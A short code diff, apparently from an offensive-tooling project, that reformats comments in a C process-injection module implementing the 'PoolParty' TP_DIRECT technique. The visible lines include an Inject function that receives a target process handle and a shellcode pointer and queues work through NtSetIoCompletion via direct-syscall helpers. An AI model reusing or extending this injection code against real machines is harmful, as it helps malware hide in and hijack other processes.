@@ -1,4 +1,6 @@
-// Technique: PoolParty IO - TP_DIRECT
+/*
+    Technique: PoolParty IO - TP_DIRECT
+*/
 
 #include "injection.h"
 #include "../syscalls/syscalls.h"
@@ -101,7 +103,9 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
         return -1;
     }
 
-    // [ Connect TpDirect to the completionIo (queue) ]
+    //
+    // Connect TpDirect to the completionIo (queue)
+    //
     CallAde(sinner, "NtSetIoCompletion", status,
         completionIoHandle,
         remoteTpDirect,
